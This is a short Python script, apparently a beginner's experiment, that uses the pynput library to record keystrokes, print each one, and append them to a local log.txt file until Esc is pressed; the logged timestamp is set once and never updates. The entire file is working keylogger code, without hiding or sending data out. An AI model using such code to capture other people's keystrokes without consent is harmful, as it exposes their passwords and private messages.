### key logger explementation

from pynput.keyboard import Key, Listener
from datetime import datetime


dt = datetime.now()
count = 0
keys = []

# press keyboard and 3 lines one count
def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{} pressed" .format(key))

    if count >= 3:
        count = 0
        write_file(keys)
        keys = []


# write each of press to seperated line
def write_file(keys):
    with open("log.txt", "a") as log:
        for key in keys:
            log.write('{}\t{} pressed\n'.format(dt, str(key)))


# press esc to stop the explimentation
def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

